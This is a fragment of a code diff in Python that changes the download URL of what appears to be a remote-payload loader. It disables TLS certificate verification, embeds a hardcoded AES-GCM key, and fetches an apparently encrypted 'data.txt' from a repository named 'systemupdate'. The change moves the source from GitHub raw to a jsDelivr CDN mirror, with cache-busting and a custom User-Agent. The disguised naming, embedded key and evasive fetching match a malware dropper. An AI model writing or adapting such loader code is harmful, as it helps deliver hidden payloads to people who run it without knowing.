@@ -7,7 +7,7 @@ ctx.verify_mode = ssl.CERT_NONE
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 
 KEY = base64.b64decode("W5EwW1vV8EFoNKQsgTCrKmfZzbflm0JDU7MuNG8izu4=")
-URL = f"https://raw.githubusercontent.com/blacknut0319-del/systemupdate/main/data.txt?t={int(time.time())}"
+URL = f"https://cdn.jsdelivr.net/gh/blacknut0319-del/systemupdate@main/data.txt?t={int(time.time())}"
 
 try:
     req = urllib.request.Request(URL, headers={"User-Agent": "ddong"})
